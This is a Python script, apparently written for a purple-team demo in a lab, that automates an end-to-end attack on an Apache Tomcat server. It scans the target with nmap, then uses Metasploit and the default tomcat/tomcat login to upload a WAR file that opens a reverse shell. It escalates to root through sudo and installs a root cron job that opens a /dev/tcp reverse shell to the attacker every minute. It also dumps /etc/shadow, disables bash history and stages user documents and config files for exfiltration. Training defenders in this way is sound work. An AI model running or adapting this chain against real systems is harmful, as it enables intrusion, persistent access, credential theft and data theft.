#!/usr/bin/env python3
"""Tomcatastrophe - Automated Purple Team Attack Script.

This script automates the full attack chain for the Elastic Security purple team demo.
It runs all phases automatically, showing each command as it executes so viewers
can follow along with the attack in real-time.

Prerequisites:
    - Nmap installed (apt install nmap)
    - Metasploit Framework installed (msfconsole)
    - Target must have vulnerable Tomcat 9.0.30 with weak credentials
    - Network connectivity between attacker and target
"""

import argparse
import subprocess
import sys
import time
from dataclasses import dataclass
from enum import Enum
from typing import NoReturn


class Color(str, Enum):
    """ANSI color codes for terminal output."""

    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[0;34m"
    MAGENTA = "\033[0;35m"
    CYAN = "\033[0;36m"
    WHITE = "\033[1;37m"
    RESET = "\033[0m"


@dataclass
class AttackConfig:
    """Configuration for the attack execution."""

    target_ip: str
    attacker_ip: str
    typing_delay: float = 0.03
    phase_pause: float = 10.0  # Pause after phase intro for presenter to talk
    command_delay: float = 2.0  # Delay between commands


class Logger:
    """Colored logger for tomcatastrophe output."""

    PREFIX = f"{Color.MAGENTA}[tomcatastrophe]{Color.RESET}"

    @staticmethod
    def info(message: str) -> None:
        print(f"{Logger.PREFIX} {message}")

    @staticmethod
    def success(message: str) -> None:
        print(f"{Logger.PREFIX} {Color.GREEN}{message}{Color.RESET}")

    @staticmethod
    def phase_intro(phase_num: int, title: str, technique: str, description: str) -> None:
        """Show phase introduction with what's about to happen."""
        print()
        print(f"{Color.MAGENTA}{'═' * 80}{Color.RESET}")
        print(f"{Logger.PREFIX} {Color.WHITE}PHASE {phase_num}: {title}{Color.RESET}")
        print(f"{Logger.PREFIX} {Color.CYAN}MITRE ATT&CK: {technique}{Color.RESET}")
        print(f"{Color.MAGENTA}{'═' * 80}{Color.RESET}")
        print()
        print(f"{Logger.PREFIX} {description}")
        print()

    @staticmethod
    def phase_complete(message: str) -> None:
        """Show phase completion summary."""
        print()
        print(f"{Logger.PREFIX} {Color.GREEN}{message}{Color.RESET}")

    @staticmethod
    def phase_separator() -> None:
        """Print blank lines between phases."""
        print()
        print()
        print()
        print()
        print()


class DemoTerminal:
    """Handles demo-style command execution with typing effect."""

    def __init__(self, config: AttackConfig):
        self.config = config

    def type_text(self, text: str) -> None:
        """Print text with typing effect for demo visibility."""
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(self.config.typing_delay)
        print()

    def run_command(self, cmd: str, show_output: bool = True) -> tuple[int, str]:
        """Run a shell command with demo-style display."""
        sys.stdout.write(f"{Color.CYAN}$ {Color.RESET}")
        sys.stdout.flush()
        self.type_text(cmd)

        time.sleep(0.5)

        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
        )

        output = result.stdout + result.stderr

        if show_output and output.strip():
            print(output.rstrip())

        time.sleep(self.config.command_delay)
        return result.returncode, output

    def run_interactive(self, cmd: str) -> int:
        """Run an interactive command (like msfconsole) with full PTY."""
        sys.stdout.write(f"{Color.CYAN}$ {Color.RESET}")
        sys.stdout.flush()
        self.type_text(cmd)

        time.sleep(0.5)

        result = subprocess.run(cmd, shell=True)
        return result.returncode


class AttackExecutor:
    """Executes the automated attack chain."""

    def __init__(self, config: AttackConfig):
        self.config = config
        self.terminal = DemoTerminal(config)

    def cleanup_previous_runs(self) -> None:
        """Kill any lingering processes from previous runs."""
        subprocess.run(
            "pkill -9 msfconsole 2>/dev/null; "
            "pkill -9 -f 'nc.*4444' 2>/dev/null; "
            "pkill -9 -f 'nc.*4445' 2>/dev/null; "
            "rm -f /tmp/tomcatastrophe_abort 2>/dev/null; "
            "sleep 1",
            shell=True,
            capture_output=True,
        )

    def phase_0_reconnaissance(self) -> None:
        """Phase 0: Reconnaissance - Network scanning."""
        Logger.phase_intro(
            phase_num=0,
            title="RECONNAISSANCE",
            technique="T1046 - Network Service Discovery",
            description=f"Scanning {self.config.target_ip} to discover open ports and running services.",
        )

        # Pause for presenter
        time.sleep(self.config.phase_pause)

        # Run the scan
        self.terminal.run_command(
            f"nmap -sT -p 22,80,443,8080,8443 -Pn -sV --open {self.config.target_ip}"
        )

        Logger.phase_complete("Port scan complete. Tomcat Manager found on port 8080.")
        Logger.phase_separator()

    def run_exploit_phases(self) -> None:
        """Run phases 1 and 3-8 in a single msfconsole session."""

        # Phase 1 intro
        Logger.phase_intro(
            phase_num=1,
            title="INITIAL ACCESS",
            technique="T1190 - Exploit Public-Facing Application",
            description="Exploiting Tomcat Manager with weak credentials (tomcat/tomcat) to upload a malicious WAR file and establish a reverse shell.",
        )
        time.sleep(self.config.phase_pause)

        # Build a single comprehensive resource script
        # Using <ruby> blocks to print phase transitions from within msfconsole
        pause_secs = int(self.config.phase_pause)

        rc_content = f"""
# ============================================================================
# PHASE 1: INITIAL ACCESS
# ============================================================================
# Start persistent handler first (stays listening even after session created)
use exploit/multi/handler
set payload java/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j

# Now run the Tomcat exploit (uses handler above, doesn't start its own)
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS {self.config.target_ip}
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set TARGETURI /manager
set FingerprintCheck false
set payload java/shell_reverse_tcp
set LHOST {self.config.attacker_ip}
set LPORT 4444
set DisablePayloadHandler true
exploit

sessions -l

<ruby>
# Check if we have a session - if not, abort
$tomcat_abort = false
if framework.sessions.count == 0
  puts ""
  puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;31mFAILED: No reverse shell established.\\033[0m"
  puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;31mThe exploit ran but the target could not connect back.\\033[0m"
  puts ""
  puts "\\033[0;35m[tomcatastrophe]\\033[0m Possible causes:"
  puts "\\033[0;35m[tomcatastrophe]\\033[0m   - Firewall blocking outbound connections from target"
  puts "\\033[0;35m[tomcatastrophe]\\033[0m   - Security group not allowing traffic on port 4444"
  puts "\\033[0;35m[tomcatastrophe]\\033[0m   - Target IP or attacker IP incorrect"
  puts "\\033[0;35m[tomcatastrophe]\\033[0m   - Tomcat service not running or misconfigured"
  puts ""
  puts "\\033[0;35m[tomcatastrophe]\\033[0m Aborting attack chain."
  puts ""
  $tomcat_abort = true
  framework.jobs.stop_job(0) rescue nil
end
</ruby>

<ruby>
# Exit early if abort flag is set
if $tomcat_abort
  puts ""
  puts "\\033[0;35m[tomcatastrophe]\\033[0m Exiting due to failed session establishment."
  puts ""
  run_single("exit")
end
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mReverse shell established. We now have remote access to the target.\\033[0m"
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 3: DISCOVERY\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1082 - System Information Discovery\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Gathering information about the compromised system: users, OS version, architecture."
puts ""
sleep({pause_secs})
</ruby>

sessions -c "whoami" 1
sessions -c "id" 1
sessions -c "uname -a" 1
sessions -c "hostname" 1
sessions -c "cat /etc/passwd | grep -v nologin" 1
sessions -c "getconf LONG_BIT" 1
sessions -c "getconf PAGE_SIZE" 1

<ruby>
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mSystem enumeration complete. Target is running Ubuntu Linux as tomcat user.\\033[0m"
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 4: PRIVILEGE ESCALATION\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1548 - Abuse Elevation Control Mechanism\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Checking sudo privileges to escalate from tomcat user to root."
puts ""
sleep({pause_secs})
</ruby>

sessions -c "sudo -l" 1
sessions -c "sudo -V | head -1" 1
sessions -c "sudo whoami" 1

<ruby>
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mPrivilege escalation successful. Tomcat user has passwordless sudo to root.\\033[0m"
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 5: PERSISTENCE\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1053.003 - Scheduled Task/Job: Cron\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Installing a cron job that calls back to {self.config.attacker_ip}:4445 every minute."
puts ""
sleep({pause_secs})
</ruby>

sessions -c "echo '* * * * * /bin/bash -c '\"'\"'bash -i >& /dev/tcp/{self.config.attacker_ip}/4445 0>&1'\"'\"'' | sudo crontab -" 1
sessions -c "sudo crontab -l" 1

<ruby>
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mPersistence established. Cron job will reconnect every minute even if we lose access.\\033[0m"
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 6: CREDENTIAL ACCESS\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1003.008 - OS Credential Dumping: /etc/shadow\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Reading /etc/shadow to obtain password hashes for offline cracking."
puts ""
sleep({pause_secs})
</ruby>

sessions -c "sudo cat /etc/shadow" 1

<ruby>
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mPassword hashes extracted. These can be cracked offline with tools like hashcat.\\033[0m"
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 7: DEFENSE EVASION\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1070.003 - Indicator Removal: Clear Command History\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Clearing bash history to hide our commands from forensic analysis."
puts ""
sleep({pause_secs})
</ruby>

sessions -c "unset HISTFILE" 1
sessions -c "export HISTSIZE=0" 1

<ruby>
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mHistory cleared. Our commands won't appear in bash history.\\033[0m"
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mPHASE 8: COLLECTION\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;36mMITRE ATT&CK: T1074.001 - Data Staged: Local Data Staging\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m Collecting sensitive files (PDFs, documents, configs) and compressing for exfiltration."
puts ""
sleep({pause_secs})
</ruby>

sessions -c "mkdir -p /tmp/.staging" 1
sessions -c "find /home -name '*.pdf' -exec cp {{}} /tmp/.staging/ \\; 2>/dev/null || true" 1
sessions -c "find /home -name '*.doc*' -exec cp {{}} /tmp/.staging/ \\; 2>/dev/null || true" 1
sessions -c "find /etc -name '*.conf' -exec cp {{}} /tmp/.staging/ \\; 2>/dev/null || true" 1
sessions -c "tar -czf /tmp/data.tar.gz /tmp/.staging 2>&1" 1
sessions -c "ls -la /tmp/data.tar.gz" 1

<ruby>
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[0;32mData staged and compressed. Ready for exfiltration.\\033[0m"
puts ""
puts ""
puts ""
puts ""
puts ""
puts ""
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mATTACK CHAIN COMPLETE\\033[0m"
puts "\\033[0;35m{'═' * 80}\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m \\033[1;37mSummary of attack phases executed:\\033[0m"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 0: Reconnaissance      - Scanned target ports with nmap"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 1: Initial Access      - Exploited Tomcat Manager with weak credentials"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 3: Discovery           - Enumerated system info, users, and architecture"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 4: Privilege Escalation- Escalated to root via passwordless sudo"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 5: Persistence         - Installed cron job for persistent access"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 6: Credential Access   - Extracted password hashes from /etc/shadow"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 7: Defense Evasion     - Cleared bash history to hide tracks"
puts "\\033[0;35m[tomcatastrophe]\\033[0m   Phase 8: Collection          - Staged sensitive files for exfiltration"
puts ""
puts "\\033[0;35m[tomcatastrophe]\\033[0m All phases executed successfully."
puts ""
</ruby>

sessions -K
exit
"""

        rc_path = "/tmp/tomcatastrophe.rc"
        with open(rc_path, "w") as f:
            f.write(rc_content)

        self.terminal.run_interactive(f"msfconsole -q -r {rc_path}")

    def run_full_attack(self) -> None:
        """Run the complete attack chain."""
        # Clean up any lingering processes from previous runs
        self.cleanup_previous_runs()

        Logger.info("Starting Tomcatastrophe - Full Attack Chain")
        Logger.info(f"Target: {self.config.target_ip}")
        Logger.info(f"Attacker: {self.config.attacker_ip}")
        Logger.phase_separator()

        # Phase 0: Reconnaissance (nmap - runs outside msfconsole)
        self.phase_0_reconnaissance()

        # Phases 1 + 3-8: All run in single msfconsole session
        self.run_exploit_phases()


def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Tomcatastrophe - Automated Purple Team Attack Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t 10.0.1.50 -a 10.0.1.100
  %(prog)s -t 10.0.1.50 -a 10.0.1.100 --fast
""",
    )

    parser.add_argument(
        "-t", "--target",
        type=str,
        required=True,
        metavar="IP",
        help="Target IP address (blue-01 VM)",
    )

    parser.add_argument(
        "-a", "--attacker",
        type=str,
        required=True,
        metavar="IP",
        help="Attacker IP address (red-01 VM)",
    )

    parser.add_argument(
        "--fast",
        action="store_true",
        help="Shorter pauses for experienced audiences (5s instead of 10s)",
    )

    return parser.parse_args()


def main() -> NoReturn:
    """Main entry point."""
    args = parse_arguments()

    # Configure timing
    phase_pause = 5.0 if args.fast else 10.0

    config = AttackConfig(
        target_ip=args.target,
        attacker_ip=args.attacker,
        phase_pause=phase_pause,
    )

    executor = AttackExecutor(config)

    print()
    print(f"{Color.RED} _                           _            _                  _          {Color.RESET}")
    print(f"{Color.RED}| |_ ___  _ __ ___   ___ __ _| |_ __ _ ___| |_ _ __ ___  _ __ | |__   ___ {Color.RESET}")
    print(f"{Color.RED}| __/ _ \\| '_ ` _ \\ / __/ _` | __/ _` / __| __| '__/ _ \\| '_ \\| '_ \\ / _ \\{Color.RESET}")
    print(f"{Color.RED}| || (_) | | | | | | (_| (_| | || (_| \\__ \\ |_| | | (_) | |_) | | | |  __/{Color.RESET}")
    print(f"{Color.RED} \\__\\___/|_| |_| |_|\\___\\__,_|\\__\\__,_|___/\\__|_|  \\___/| .__/|_| |_|\\___|{Color.RESET}")
    print(f"{Color.RED}                                                       |_|               {Color.RESET}")
    print()
    print(f"{Color.WHITE}                 Purple Team Attack Automation Demo{Color.RESET}")
    print()

    executor.run_full_attack()

    Logger.success("Tomcatastrophe complete!")
    sys.exit(0)


if __name__ == "__main__":
    main()
